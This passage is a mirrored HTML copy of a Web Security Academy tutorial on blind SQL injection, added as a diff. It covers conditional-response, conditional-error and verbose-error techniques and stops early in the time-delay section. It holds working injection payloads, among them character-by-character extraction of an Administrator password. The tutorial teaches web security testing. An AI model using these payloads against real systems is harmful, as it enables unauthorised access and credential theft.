@@ -1,0 +1,726 @@
+<!DOCTYPE html>
+<html>
+
+<!-- Mirrored from portswigger.net/web-security/sql-injection/blind by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 17 Apr 2026 22:05:45 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>What is Blind SQL Injection? Tutorial &amp; Examples | Web Security Academy</title>
+    <meta content="In this section, we describe techniques for finding and exploiting blind SQL injection vulnerabilities. What is blind SQL injection? Blind SQL injection ..." name="description">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="">
+<meta name="twitter:image" content="../../content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAcademy">
+
+<!-- Open Graph data -->
+<meta property="og:title" content=""/>
+<meta property="og:url" content="https://portswigger.net/"/>
+<meta property="og:image" content="../../content/images/logos/academy-twittercard.png"/>
+<meta property="og:type" content="website"/>
+<link rel="canonical" href="blind.html"/>
+<link rel="icon" href="../../content/images/logos/favicon.ico" type="image/x-icon"/>
+<link rel="apple-touch-icon" href="../../content/images/logos/apple-touch-icon.png">
+    <link href="../../content/pswebsecacademy.css" rel="stylesheet" type="text/css">
+    <link rel="preload" href="../../content/fonts/ps-icons-small/ps-icons-small5722.woff?td2uot" as="font" crossorigin="anonymous">
+<link rel="preload" href="../../content/fonts/ps-main/ps-icons6208.woff?l1la2n" as="font" crossorigin="anonymous">
+</head>
+<body class="theme-">
+
+
+<script nonce="ipU88NCbjZGLM67vVK/YS7ngGYyHZJer">
+    (function (window, document, dataLayerName, id) {
+        window[dataLayerName] = window[dataLayerName] || [], window[dataLayerName].push({
+            start: (new Date).getTime(),
+            event: "stg.start"
+        });
+        var scripts = document.getElementsByTagName('script')[0], tags = document.createElement('script');
+        var qP = [];
+        dataLayerName !== "dataLayer" && qP.push("data_layer_name=" + dataLayerName), tags.nonce = "ipU88NCbjZGLM67vVK/YS7ngGYyHZJer";
+        var qPString = qP.length > 0 ? ("?" + qP.join("&")) : "";
+        tags.async = !0, tags.src = "https://ps.containers.piwik.pro/" + id + ".js" + qPString,
+            scripts.parentNode.insertBefore(tags, scripts);
+        !function (a, n, i) {
+            a[n] = a[n] || {};
+            for (var c = 0; c < i.length; c++) !function (i) {
+                a[n][i] = a[n][i] || {}, a[n][i].api = a[n][i].api || function () {
+                    var a = [].slice.call(arguments, 0);
+                    "string" == typeof a[0] && window[dataLayerName].push({
+                        event: n + "." + i + ":" + a[0],
+                        parameters: [].slice.call(arguments, 1)
+                    })
+                }
+            }(i[c])
+        }(window, "ppms", ["tm", "cm"]);
+    })(window, document, 'dataLayer', '287552c2-4917-42e0-8982-ba994a2a73d7');
+</script>
+
+
+
+<header class="page-header" id="top">
+    <div class="container">
+    <a class="logo" href="https://portswigger.net/"></a>
+    <div class="header-right">
+        <div class="login-buttons">
+            <a class="button-orange-small" href="https://portswigger.net/users/youraccount/personaldetails">My account</a>
+        </div>
+        
+
+    <input type="checkbox" id="hamburger-mobile" class="hamburger-input-mobile">
+    <input type="radio" id="hamburger-desktop" class="hamburger-input-desktop" name="mega-nav-input">
+    <div class="hamburger-menu-mobile">
+        <label class="hamburger-menu-label header-hidden" for="hamburger-mobile">
+            <span class="hamburger-layers"></span>
+        </label>
+    </div>
+    <div class="mega-nav">
+        <input type="radio" id="mega-nav-close" class="mega-nav-input-close" name="mega-nav-input">
+        <input type="radio" id="mega-nav-label-1" class="mega-nav-input-1" name="mega-nav-input">
+        <input type="radio" id="mega-nav-label-2" class="mega-nav-input-2" name="mega-nav-input">
+        <input type="radio" id="mega-nav-label-6" class="mega-nav-input-6" name="mega-nav-input">
+        <input type="radio" id="mega-nav-label-7" class="mega-nav-input-7" name="mega-nav-input">
+
+        <label for="mega-nav-close" class="mega-nav-close"></label>
+
+        <label class="mega-nav-label mega-nav-label-1" for="mega-nav-label-1">
+            <span class="mega-nav-text">Products</span>
+            <span class="icon-arrow-head-down"></span>
+        </label>
+        <label class="mega-nav-label mega-nav-label-2" for="mega-nav-label-2">
+            <span class="mega-nav-text">Solutions</span>
+            <span class="icon-arrow-head-down"></span>
+        </label>
+        <a class="mega-nav-link" href="https://portswigger.net/research"><span class="mega-nav-text">Research</span></a>
+        <a class="mega-nav-link" href="https://portswigger.net/web-security"><span class="mega-nav-text">Academy</span></a>
+        <label class="mega-nav-label mega-nav-label-6" for="mega-nav-label-6">
+            <span class="mega-nav-text">Support</span>
+            <span class="icon-arrow-head-down"></span>
+        </label>
+
+        <label class="mega-nav-label mega-nav-label-7 header-hidden" for="mega-nav-label-7">
+            <span class="mega-nav-text">Company</span>
+            <span class="icon-arrow-head-down"></span>
+        </label>
+        <div class="hamburger-menu-desktop">
+            <label class="hamburger-menu-label header-show" for="hamburger-desktop">
+                <span class="hamburger-layers"></span>
+            </label>
+            <div>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-1" href="https://portswigger.net/customers"><span class="mega-nav-text">Customers</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-3" href="https://portswigger.net/about"><span class="mega-nav-text">About</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-4" href="https://portswigger.net/blog"><span class="mega-nav-text">Blog</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-5" href="https://portswigger.net/careers"><span class="mega-nav-text">Careers</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-6" href="https://portswigger.net/legal"><span class="mega-nav-text">Legal</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-7" href="https://portswigger.net/contact"><span class="mega-nav-text">Contact</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-8" href="https://portswigger.net/support/reseller-faqs"><span class="mega-nav-text">Resellers</span></a>
+            </div>
+        </div>
+
+        <a class="mega-nav-link header-hidden" href="https://portswigger.net/users/youraccount"><span class="mega-nav-text">My account</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-1" href="https://portswigger.net/customers"><span class="mega-nav-text">Customers</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-3" href="https://portswigger.net/about"><span class="mega-nav-text">About</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-4" href="https://portswigger.net/blog"><span class="mega-nav-text">Blog</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-5" href="https://portswigger.net/careers"><span class="mega-nav-text">Careers</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-6" href="https://portswigger.net/legal"><span class="mega-nav-text">Legal</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-7" href="https://portswigger.net/contact"><span class="mega-nav-text">Contact</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-8" href="https://portswigger.net/support/reseller-faqs"><span class="mega-nav-text">Resellers</span></a>
+
+        <div class="mega-nav-container">
+
+            <div class="mega-nav-content mega-nav-content-1">
+                <div class="section-white-medium-no-padding">
+                    <div class="container-columns-66-percent-right">
+                        <div>
+                            <a href="https://portswigger.net/burp/enterprise" class="link-block-white">
+                                <img src="../../content/images/svg/icons/enterprise.svg" alt="Burp Suite DAST">
+                                <span><strong>Burp Suite DAST</strong></span>
+                                <span>The enterprise-enabled dynamic web vulnerability scanner.</span>
+                            </a>
+
+                            <a href="https://portswigger.net/burp/pro" class="link-block-white">
+                                <img src="../../content/images/svg/icons/professional.svg" alt="Burp Suite Professional">
+                                <span><strong>Burp Suite Professional</strong></span>
+                                <span>The world's #1 web penetration testing toolkit.</span>
+                            </a>
+
+                            <a href="https://portswigger.net/burp/communitydownload" class="link-block-white">
+                                <img src="../../content/images/svg/icons/community.svg" alt="Burp Suite Community Edition">
+                                <span><strong>Burp Suite Community Edition</strong></span>
+                                <span>The best manual tools to start web security testing.</span>
+                            </a>
+
+                            <a href="https://portswigger.net/burp" class="chevron-after">View all product editions</a>
+                        </div>
+
+                        <div>
+                            <div class="container-cards-lists-white">
+                                <a href="https://portswigger.net/burp/vulnerability-scanner">
+                                    <p><strong>Burp Scanner</strong></p>
+                                    <p>Burp Suite's web vulnerability scanner</p>
+                                    <img src="../../mega-nav/images/burp-suite-scanner.jpg" alt="Burp Suite's web vulnerability scanner'">
+                                </a>
+                            </div>
+
+                        </div>
+
+
+                    </div>
+                </div>
+            </div>
+
+            <div class="mega-nav-content mega-nav-content-2">
+                <div class="section-white-medium-no-padding">
+                    <div class="container-columns-66-percent-right">
+                        <div>
+                            <div class="container-columns">
+                                <a href="https://portswigger.net/solutions/attack-surface-visibility" class="link-block-white">
+                                    <span><strong>Attack surface visibility</strong></span>
+                                    <span>Improve security posture, prioritize manual testing, free up time.</span>
+                                </a>
+                                <a href="https://portswigger.net/solutions/ci-driven-scanning" class="link-block-white">
+                                    <span><strong>CI-driven scanning</strong></span>
+                                    <span>More proactive security - find and fix vulnerabilities earlier.</span>
+                                </a>
+                                <a href="https://portswigger.net/solutions" class="link-block-white">
+                                    <span><strong>Application security testing</strong></span>
+                                    <span>See how our software enables the world to secure the web.</span>
+                                </a>
+                                <a href="https://portswigger.net/solutions/devsecops" class="link-block-white">
+                                    <span><strong>DevSecOps</strong></span>
+                                    <span>Catch critical bugs; ship more secure software, more quickly.</span>
+                                </a>
+
+                                <a href="https://portswigger.net/solutions/penetration-testing" class="link-block-white">
+                                    <span><strong>Penetration testing</strong></span>
+                                    <span>Accelerate penetration testing - find more bugs, more quickly.</span>
+                                </a>
+                                <a href="https://portswigger.net/solutions/automated-security-testing" class="link-block-white">
+                                    <span><strong>Automated scanning</strong></span>
+                                    <span>Scale dynamic scanning. Reduce risk. Save time/money.</span>
+                                </a>
+
+                                <a href="https://portswigger.net/solutions/bug-bounty-hunting" class="link-block-white">
+                                    <span><strong>Bug bounty hunting</strong></span>
+                                    <span>Level up your hacking and earn more bug bounties.</span>
+                                </a>
+                                <a href="https://portswigger.net/solutions/compliance" class="link-block-white">
+                                    <span><strong>Compliance</strong></span>
+                                    <span>Enhance security monitoring to comply with confidence.</span>
+                                </a>
+                            </div>
+                            <a href="https://portswigger.net/solutions" class="chevron-after">View all solutions</a>
+                        </div>
+
+                        <div>
+                            <div class="container-cards-lists-white">
+                                <a href="https://portswigger.net/burp/enterprise/resources/enterprise-edition-vs-professional">
+                                    <p><strong>Product comparison</strong></p>
+                                    <p>What's the difference between Pro and Enterprise Edition?</p>
+                                    <img src="../../mega-nav/images/burp-suite.jpg" alt="Burp Suite Professional vs Burp Suite Enterprise Edition">
+                                </a>
+                            </div>
+
+                        </div>
+
+
+                    </div>
+                </div>
+            </div>
+
+            <div class="mega-nav-content mega-nav-content-6">
+                <div class="section-white-medium-no-padding">
+                    <div class="container-columns-66-percent-right">
+                        <div>
+                            <div class="container-columns">
+                                <a href="https://portswigger.net/support" class="link-block-white">
+                                    <span><strong>Support Center</strong></span>
+                                    <span>Get help and advice from our experts on all things Burp.</span>
+                                </a>
+                                <a href="https://portswigger.net/burp/documentation" class="link-block-white">
+                                    <span><strong>Documentation</strong></span>
+                                    <span>Tutorials and guides for Burp Suite.</span>
+                                </a>
+                                <a href="https://portswigger.net/burp/documentation/desktop/getting-started" class="link-block-white">
+                                    <span><strong>Get Started - Professional</strong></span>
+                                    <span>Get started with Burp Suite Professional.</span>
+                                </a>
+                                <a href="https://portswigger.net/burp/documentation/enterprise/getting-started" class="link-block-white">
+                                    <span><strong>Get Started - Enterprise</strong></span>
+                                    <span>Get started with Burp Suite Enterprise Edition.</span>
+                                </a>
+                                <a href="https://forum.portswigger.net/" class="link-block-white">
+                                    <span><strong>User Forum</strong></span>
+                                    <span>Get your questions answered in the User Forum.</span>
+                                </a>
+                                <a href="https://portswigger.net/burp/releases" class="link-block-white">
+                                    <span><strong>Downloads</strong></span>
+                                    <span>Download the latest version of Burp Suite.</span>
+                                </a>
+                            </div>
+                            <a href="https://portswigger.net/support" class="chevron-after">Visit the Support Center</a>
+                        </div>
+
+                        <div>
+                            <div class="container-cards-lists-white">
+                                <a href="https://portswigger.net/burp/releases">
+                                    <p><strong>Downloads</strong></p>
+                                    <p>Download the latest version of Burp Suite.</p>
+                                    <img src="../../mega-nav/images/latest-burp-suite-software-download.jpg" alt="The latest version of Burp Suite software for download">
+                                </a>
+                            </div>
+
+                        </div>
+
+
+                    </div>
+                </div>
+            </div>
+
+        </div>
+
+    </div>
+
+
+    </div>
+</div>
+</header>
+
+            <nav class="navigation-top">
+                <input type="checkbox" id="nav-main-enterprise">
+                <label for="nav-main-enterprise">
+                    <span>Academy home</span>
+                    <span class="icon-arrow-head-down"></span>
+                </label>
+                <ul>
+                    <li><a href="../dashboard.html">Dashboard</a></li>
+                    <li><a href="../learning-paths.html">Learning paths</a></li>
+                    <li>
+                        <input type="checkbox" id="nav-main-academy-topics">
+                        <label for="nav-main-academy-topics">
+                            <span>Latest topics</span>
+                            <span class="icon-arrow-head-down"></span>
+                        </label>
+                        <div>
+                            <a href="../request-smuggling.html">Request smuggling</a>
+                            <a href="../web-cache-deception.html">Web cache deception</a>
+                            <a href="../llm-attacks.html">Web LLM attacks</a>
+                            <a href="../api-testing.html">API testing</a>
+                            <a href="../nosql-injection.html">NoSQL injection</a>
+                            <a href="../all-topics.html">View all topics</a>
+                        </div>
+                    </li>
+                    <li>
+                        <input type="checkbox" id="nav-main-academy-all-content">
+                        <label for="nav-main-academy-all-content">
+                            <span>All content</span>
+                            <span class="icon-arrow-head-down"></span>
+                        </label>
+                        <div>
+                            <a href="../all-labs.html">All labs</a>
+                            <a href="../all-topics.html">All topics</a>
+                            <a href="../mystery-lab-challenge.html">Mystery labs</a>
+                        </div>
+                    </li>
+                    <li>
+                        <input type="checkbox" id="nav-main-academy-hall-of-fame">
+                        <label for="nav-main-academy-hall-of-fame">
+                            <span>Hall of Fame</span>
+                            <span class="icon-arrow-head-down"></span>
+                        </label>
+                        <div>
+                            <a href="../hall-of-fame.html">Leaderboard</a>
+                            <a href="../getting-started/kamil-vavra.html">Interview - Kamil Vavra</a>
+                            <a href="../getting-started/johnny-villarreal.html">Interview - Johnny Villarreal</a>
+                            <a href="../getting-started/andres-rauschecker.html">Interview - Andres Rauschecker</a>
+                        </div>
+                    </li>
+                    <li><a href="../getting-started.html">Get started</a></li>
+                    <li>
+                        <input type="checkbox" id="nav-main-academy-certification">
+                        <label for="nav-main-academy-certification">
+                             <span>Get certified</span>
+                             <span class="icon-arrow-head-down"></span>
+                        </label>
+                        <div>
+                             <a href="../certification.html">Get certified</a>
+                             <a href="../certification/how-to-prepare.html">How to prepare</a>
+                             <a href="../certification/how-it-works.html">How it works</a>
+                             <a href="../certification/practice-exam.html">Practice exam</a>
+                             <a href="../certification/exam-hints-and-guidance.html">Exam hints and guidance</a>
+                             <a href="../certification/how-it-works.html#what-the-exam-involves">What the exam involves</a>
+                             <a href="../certification/frequently-asked-questions.html">FAQs</a>
+                             <a href="../certification.html#validate-your-certification">Validate your certification</a>
+                        </div>
+                    </li>
+                </ul>
+            </nav>
+        
+<div class="wrapper-large">
+    <div class="container-academy">
+
+        <input class="nav-lhs-toggle-input" type="checkbox" id="nav-lhs-toggle">
+        <aside class="nav-lhs" id="tree-nav" tree-nav-version="36">
+            <nav class="nav-lhs-scrollable">
+                <label class="nav-lhs-toggle-label" for="nav-lhs-toggle"></label>
+                
+
+        <a class="nav-back" href="../all-topics.html">
+            <span class="icon-arrow-head-left"></span>
+            Back to all topics
+        </a>
+        <input type="checkbox" id="nav-main-id">
+        <label class="nav-label" for="nav-main-id">
+            <span class="icon-arrow-head-down"></span>
+        </label>
+        <h3>SQL injection</h3>
+        <ul>
+            <li><a href="../sql-injection.html#what-is-sql-injection-sqli">What is SQL injection?</a></li>
+            <li><a href="../sql-injection.html#what-is-the-impact-of-a-successful-sql-injection-attack">What is the impact of SQL injection?</a></li>
+            <li>
+                <input type="checkbox" id="sub-nav-id-3">
+                <label for="sub-nav-id-3">
+                    <a href="../sql-injection.html#how-to-detect-sql-injection-vulnerabilities">Detecting SQL injection vulnerabilities</a>
+                    <span class="icon-arrow-head-down"></span>
+                </label>
+                <ul>
+                    <li><a href="../sql-injection.html#sql-injection-in-different-parts-of-the-query">In different parts of the query</a></li>
+                    <li><a href="../sql-injection.html#sql-injection-in-different-contexts">In different contexts</a></li>
+                </ul>
+            </li>
+            <li>
+                <input type="checkbox" id="sub-nav-id-2">
+                <label for="sub-nav-id-2">
+                    <a href="../sql-injection.html#sql-injection-examples">Examples of SQL injection</a>
+                    <span class="icon-arrow-head-down"></span>
+                </label>
+                <ul>
+                    <li><a href="../sql-injection.html#retrieving-hidden-data">Retrieving hidden data</a></li>
+                    <li><a href="../sql-injection.html#subverting-application-logic">Subverting application logic</a></li>
+                    <li><a href="../sql-injection.html#retrieving-data-from-other-database-tables">Retrieving data from other tables</a></li>
+                    <li><a href="../sql-injection.html#examining-the-database">Examining the database</a></li>
+                    <li><a href="../sql-injection.html#blind-sql-injection-vulnerabilities">Blind SQL injection</a></li>
+                    <li><a href="../sql-injection.html#second-order-sql-injection">Second-order SQL injection</a></li>
+                </ul>
+            </li>
+            <li>
+                <input type="checkbox" id="sub-nav-id-7">
+                <label for="sub-nav-id-7">
+                    <a href="examining-the-database.html">Examining the database</a>
+                    <span class="icon-arrow-head-down"></span>
+                </label>
+                <ul>
+                    <li><a href="examining-the-database.html#querying-the-database-type-and-version">Querying the type and version</a></li>
+                    <li><a href="examining-the-database.html#listing-the-contents-of-the-database">Listing the contents</a></li>
+                </ul>
+            </li>
+            <li>
+                <input type="checkbox" id="sub-nav-id-6">
+                <label for="sub-nav-id-6">
+                    <a href="union-attacks.html">UNION attacks</a>
+                    <span class="icon-arrow-head-down"></span>
+                </label>
+                <ul>
+                    <li><a href="union-attacks.html#determining-the-number-of-columns-required">Determining the number of columns</a></li>
+                    <li><a href="union-attacks.html#finding-columns-with-a-useful-data-type">Finding columns with a useful data type</a></li>
+                    <li><a href="union-attacks.html#using-a-sql-injection-union-attack-to-retrieve-interesting-data">Retrieving interesting data</a></li>
+                    <li><a href="union-attacks.html#retrieving-multiple-values-within-a-single-column">Retrieving multiple values in a single column</a></li>
+                </ul>
+            </li>
+            <li>
+                <input type="checkbox" id="sub-nav-id-8">
+                <label for="sub-nav-id-8">
+                    <a href="blind.html">Blind SQL injection</a>
+                    <span class="icon-arrow-head-down"></span>
+                </label>
+                <ul>
+                    <li><a href="blind.html#what-is-blind-sql-injection">What is blind SQL injection?</a></li>
+                    <li><a href="blind.html#exploiting-blind-sql-injection-by-triggering-conditional-responses">Triggering conditional responses</a></li>
+                    <li>
+                        <input type="checkbox" id="sub-nav-id-9">
+                        <label for="sub-nav-id-9">
+                            <a href="blind.html#error-based-sql-injection">Error-based SQL injection</a>
+                            <span class="icon-arrow-head-down"></span>
+                        </label>
+                        <ul>
+                            <li><a href="blind.html#exploiting-blind-sql-injection-by-triggering-conditional-errors">Inferring information using conditional errors</a></li>
+                            <li><a href="blind.html#extracting-sensitive-data-via-verbose-sql-error-messages">Extracting data via verbose error messages</a></li>
+                        </ul>
+                    </li>
+                    <li><a href="blind.html#exploiting-blind-sql-injection-by-triggering-time-delays">Triggering time delays</a></li>
+                    <li><a href="blind.html#exploiting-blind-sql-injection-using-out-of-band-oast-techniques">Out-of-band (OAST) techniques</a></li>
+                    <li><a href="blind.html#how-to-prevent-blind-sql-injection-attacks">Preventing blind SQL injection</a></li>
+                </ul>
+            </li>
+            <li><a href="../sql-injection.html#how-to-prevent-sql-injection">How to prevent SQL injection</a></li>
+            <li><a href="cheat-sheet.html">SQL injection cheat sheet</a></li>
+            <li><a href="../all-labs.html#sql-injection">View all SQL injection labs</a></li>
+        </ul>
+    
+            </nav>
+        </aside>
+        <main>
+            
+
+
+
+<ul class="breadcrumb-list" itemscope itemtype="http://schema.org/BreadcrumbList"><li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemscope itemtype="http://schema.org/Thing" itemprop="item" href="https://portswigger.net/web-security"><span itemprop="name">Web Security Academy</span></a><meta itemprop="position" content="1" /></li><li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemscope itemtype="http://schema.org/Thing" itemprop="item" href="../sql-injection.html"><span itemprop="name">SQL injection</span></a><meta itemprop="position" content="2" /></li><li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemscope itemtype="http://schema.org/Thing" itemprop="item" href="blind.html"><span itemprop="name">Blind</span></a><meta itemprop="position" content="3" /></li></ul>    <div class="section theme-white">
+
+        <h1 class="heading-2" id="blind-sql-injection" chunk-id="34BA93BB05D031FDA4EFD507E8AE1F5A">Blind SQL injection</h1><p>
+            In this section, we describe techniques for finding and exploiting blind SQL injection vulnerabilities.
+        </p><h2 id="what-is-blind-sql-injection" chunk-id="D3865990D37F9DF19463CB0B07E12C4B">What is blind SQL injection? </h2><p>
+            Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.
+        </p><p>
+            Many techniques such as <a href="union-attacks.html"><code>UNION</code> attacks</a> are not effective with blind SQL injection vulnerabilities. This is because they rely on being able to see the results of the injected query within the application's responses. It is still possible to exploit blind SQL injection to access unauthorized data, but different techniques must be used.
+        </p><h2 id="exploiting-blind-sql-injection-by-triggering-conditional-responses" chunk-id="23783E879D00890B1E6C5535CB95AFFB">Exploiting blind SQL injection by triggering conditional responses</h2><p>
+            Consider an application that uses tracking cookies to gather analytics about usage. Requests to the application include a cookie header like this:
+        </p><code class="code-scrollable">Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4</code><p>
+            When a request containing a <code>TrackingId</code> cookie is processed, the application uses a SQL query to determine whether this is a known user:
+        </p><code class="code-scrollable">SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'</code><p>
+            This query is vulnerable to SQL injection, but the results from the query are not returned to the user. However, the application does behave differently depending on whether the query returns any data. If you submit a recognized <code>TrackingId</code>, the query returns data and you receive a "Welcome back" message in the response.
+        </p><p>
+            This behavior is enough to be able to exploit the blind SQL injection vulnerability. You can retrieve information by triggering different responses conditionally, depending on an injected condition.
+        </p><p id="exploiting-blind-sql-injection-by-triggering-conditional-responses-9R8N" chunk-id="DA2260E191DC33559BA455E81FD79CE5">
+            To understand how this exploit works, suppose that two requests are sent containing the following <code>TrackingId</code> cookie values in turn:
+        </p><code class="code-scrollable">&#8230;xyz' AND '1'='1
+&#8230;xyz' AND '1'='2</code><ul>
+            <li>
+                The first of these values causes the query to return results, because the injected <code>AND '1'='1</code> condition is true. As a result, the "Welcome back" message is displayed.
+            </li>
+            <li>
+                The second value causes the query to not return any results, because the injected condition is false. The "Welcome back" message is not
+                displayed.
+            </li>
+        </ul><p>
+            This allows us to determine the answer to any single injected condition, and extract data one piece at a time.
+        </p><p id="exploiting-blind-sql-injection-by-triggering-conditional-responses-4M0U" chunk-id="019F9BE8A7525BE44F9DC8910F6B76D1">
+            For example, suppose there is a table called <code>Users</code> with the columns <code>Username</code> and <code>Password</code>, and a user called <code>Administrator</code>. You can determine the password for this user by sending a series of inputs to test the password one character at a time.
+        </p><p>
+            To do this, start with the following input:
+        </p><code class="code-scrollable">xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) &gt; 'm</code><p>
+            This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than <code>m</code>.
+        </p><p>
+            Next, we send the following input:
+        </p><code class="code-scrollable">xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) &gt; 't</code><p>
+            This does not return the "Welcome back" message, indicating that the injected condition is false, and so the first character of the password is not greater than <code>t</code>.
+        </p><p>
+            Eventually, we send the following input, which returns the "Welcome back" message, thereby confirming that the first character of the password is <code>s</code>:
+        </p><code class="code-scrollable">xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's</code><p>
+            We can continue this process to systematically determine the full password for the <code>Administrator</code> user.
+        </p><div class="highlightedarea">
+            <h4>Note</h4>
+            <p>
+                The <code>SUBSTRING</code> function is called <code>SUBSTR</code> on some types of database. For more details, see the <a href="cheat-sheet.html">SQL injection cheat sheet</a>.
+            </p>
+        </div><div widget-id="academy-labstatus" widget-lab-id="5AEEAC77D52D55CDFF3F9A5D86D050C9A77EBFEF7657CCCB459BEE29AD5C3FCE">
+        </div><h2 id="error-based-sql-injection" chunk-id="249E9574F0C85E7C6C64CAD08A3F6131">Error-based SQL injection</h2><p>
+            Error-based SQL injection refers to cases where you're able to use error messages to either extract or infer sensitive data from the database, even in blind contexts. The possibilities depend on the configuration of the database and the types of errors you're able to trigger:
+        </p><ul>
+            <li>
+                You may be able to induce the application to return a specific error response based on the result of a boolean expression. You can exploit this in the same way as the <a href="blind.html#exploiting-blind-sql-injection-by-triggering-conditional-responses">conditional responses</a> we looked at in the previous section. For more information, see <a href="blind.html#exploiting-blind-sql-injection-by-triggering-conditional-errors">Exploiting blind SQL injection by triggering conditional errors</a>.
+            </li>
+            <li>
+                You may be able to trigger error messages that output the data returned by the query. This effectively turns otherwise blind SQL injection vulnerabilities into visible ones. For more information, see <a href="blind.html#extracting-sensitive-data-via-verbose-sql-error-messages">Extracting sensitive data via verbose SQL error messages</a>.
+            </li>
+        </ul><h3 id="exploiting-blind-sql-injection-by-triggering-conditional-errors" chunk-id="2DEFA97EA11076E2306DA96A47950CE8">Exploiting blind SQL injection by triggering conditional errors</h3><p>
+            Some applications carry out SQL queries but their behavior doesn't change, regardless of whether the query returns any data. The technique in the previous section won't work, because injecting different boolean conditions makes no difference to the application's responses.
+        </p><p>
+            
+            It's often possible to induce the application to return a different response depending on whether a SQL error occurs. You can modify the query so that it causes a database error only if the condition is true. Very often, an unhandled error thrown by the database causes some difference in the application's response, such as an error message. This enables you to infer the truth of the injected condition.
+        </p><p id="exploiting-blind-sql-injection-by-triggering-conditional-errors-3H7T" chunk-id="2006822B9469BFF60D3A2868223DC5DE">
+            To see how this works, suppose that two requests are sent containing the following <code>TrackingId</code> cookie values in turn:
+        </p><code class="code-scrollable">xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
+xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a</code><p>
+            These inputs use the <code>CASE</code> keyword to test a condition and return a different expression depending on whether the expression is true:
+        </p><ul>
+            <li>
+                With the first input, the <code>CASE</code> expression evaluates to <code>'a'</code>, which does not cause any error.
+            </li>
+            <li>
+                With the second input, it evaluates to <code>1/0</code>, which causes a divide-by-zero error.
+            </li>
+        </ul><p>
+            If the error causes a difference in the application's HTTP response, you can use this to determine whether the injected condition is true.
+        </p><p>
+            Using this technique, you can retrieve data by testing one character at a time:
+        </p><code class="code-scrollable">xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) &gt; 'm') THEN 1/0 ELSE 'a' END FROM Users)='a</code><div class="highlightedarea">
+            <h4>Note</h4>
+            <p>
+                There are different ways of triggering conditional errors, and different techniques work best on different database types. For more details, see the <a href="cheat-sheet.html">SQL injection cheat sheet</a>.
+            </p>
+        </div><div widget-id="academy-labstatus" widget-lab-id="9622F310CE0FC2A85821811F98F2BE7B23E049667D49D018CA28F06DC0B7875A">
+        </div><h3 id="extracting-sensitive-data-via-verbose-sql-error-messages" chunk-id="FC5A4878F1BC9194CB6FE8123C0E71DE">Extracting sensitive data via verbose SQL error messages</h3><p>
+            Misconfiguration of the database sometimes results in verbose error messages. These can provide information that may be useful to an attacker. For example, consider the following error message, which occurs after injecting a single quote into an <code>id</code> parameter:
+        </p><code class="code-scrollable">Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char</code><p>
+            This shows the full query that the application constructed using our input. We can see that in this case, we're injecting into a single-quoted string inside a <code>WHERE</code> statement. This makes it easier to construct a valid query containing a malicious payload. Commenting out the rest of the query would prevent the superfluous single-quote from breaking the syntax.
+        </p><p id="extracting-sensitive-data-via-verbose-sql-error-messages-7G2X" chunk-id="D9F0B7A21B50B1A36CA341938849CCFC">
+            Occasionally, you may be able to induce the application to generate an error message that contains some of the data that is returned by the query. This effectively turns an otherwise blind SQL injection vulnerability into a visible one.
+        </p><p>
+            You can use the <code>CAST()</code> function to achieve this. It enables you to convert one data type to another. For example, imagine a query containing the following statement:
+        </p><code class="code-scrollable">CAST((SELECT example_column FROM example_table) AS int)</code><p>
+            Often, the data that you're trying to read is a string. Attempting to convert this to an incompatible data type, such as an <code>int</code>, may cause an error similar to the following:
+        </p><code class="code-scrollable">ERROR: invalid input syntax for type integer: "Example data"</code><p>
+            This type of query may also be useful if a character limit prevents you from triggering conditional responses.
+        </p><div widget-id="academy-labstatus" widget-lab-id="706318B8F1857A10698288C9BF7712276E4AB38822541EDEB0385A44DA54DE78">
+        </div><h2 id="exploiting-blind-sql-injection-by-triggering-time-delays" chunk-id="31EB54DC4E421BDAB01972B588982724">Exploiting blind SQL injection by triggering time delays</h2><p>
+            If the application catches database errors when the SQL query is executed and handles them gracefully, there won't be any difference in the application's response. This means the previous technique for inducing conditional errors will not work.
+        </p><p>
+            In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering time delays depending on whether an injected condition is true or false. As SQL queries are normally processed synchronously by the application, delaying the execution of a SQL query also delays the HTTP response. This allows you to determine the truth of the injected condition based on the time taken to receive the HTTP response.
